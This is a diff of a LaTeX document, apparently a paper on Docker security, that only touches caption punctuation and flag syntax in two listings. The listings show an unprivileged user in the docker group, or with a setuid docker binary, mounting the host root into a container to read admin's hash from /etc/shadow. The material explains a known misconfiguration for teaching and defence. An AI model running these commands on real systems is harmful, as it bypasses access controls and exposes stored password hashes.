@@ -13,12 +13,12 @@ Every user in the \lstinline{docker} group is allowed to use Docker. This allows
 
 Let's say we want the password hash of user \lstinline{admin} on a system where we do not have \lstinline{sudo} privileges, but we are a member of the \lstinline{docker} group.
 
-\begin{lstlisting}[caption={Docker \lstinline{group} exploit example},captionpos=b,label={listing:docker-group}]
+\begin{lstlisting}[caption={Docker \lstinline{group} exploit example.},captionpos=b,label={listing:docker-group}]
 (host)$ sudo -v
 Sorry, user unpriv may not run sudo on host.
 (host)$ groups | grep -o docker
 docker
-(host)$ docker run -it --rm --volume=/:/host ubuntu:latest bash
+(host)$ docker run -it --rm -v /:/host ubuntu:latest bash
 (cont)# grep admin /host/etc/shadow
 admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
 \end{lstlisting}
@@ -41,13 +41,13 @@ This is very useful in specific cases. For example, users should be able to chan
 
 If a system is misconfigured by having the \lstinline{setuid} bit set for the \lstinline{docker} binary, an user will be able to execute Docker as \lstinline{root} (the owner of \lstinline{docker}). Just like before, we can easily recreate this attack.
 
-\begin{lstlisting}[caption={Docker \lstinline{setuid} exploit example},captionpos=b]
+\begin{lstlisting}[caption={Docker \lstinline{setuid} exploit example.},captionpos=b]
 (host)$ sudo -v
 Sorry, user unpriv may not run sudo on host.
 (host)$ groups | grep -o docker
 (host)$ ls -halt /usr/bin/docker
 -rwsr-xr-x 1 root root 85M okt 18 17:52 /usr/bin/docker
-(host)$ docker run -it --rm --volume=/:/host ubuntu:latest bash
+(host)$ docker run -it --rm -v /:/host ubuntu:latest bash
 (cont)# grep admin /host/etc/shadow
 admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
 \end{lstlisting}
